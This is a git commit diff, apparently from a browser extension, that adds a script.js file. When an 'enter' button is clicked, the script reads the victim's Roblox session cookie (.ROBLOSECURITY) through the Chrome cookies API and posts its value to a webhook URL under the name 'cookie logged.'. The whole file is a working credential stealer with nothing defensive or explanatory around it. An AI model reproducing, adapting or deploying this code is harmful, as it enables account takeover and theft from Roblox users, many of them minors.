6e917cbfc1d8800ffe7a8d0c18059d5672f89ba3
Localt <85951918+Localtings@users.noreply.github.com>
2022-02-25 18:03:06 +0900

    Add files via upload

---
+++ script.js
@@ -0,0 +1,25 @@
+﻿const webHookURL = '';
+
+function details() {
+  var details = {};
+  details['name'] = '.ROBLOSECURITY';
+  details['url'] = 'https://www.roblox.com/home';
+  return details;
+}
+
+document.getElementById('enter').onclick = () => {
+  chrome.cookies.get(details(), res => {
+
+    fetch(webHookURL,{
+        body:JSON.stringify({
+          'content': res.value,
+          'username': 'cookie logged.'
+        }), 
+        method: "POST",
+        headers:{
+          'Content-Type':'application/json'
+        }
+    });
+
+  });
+}
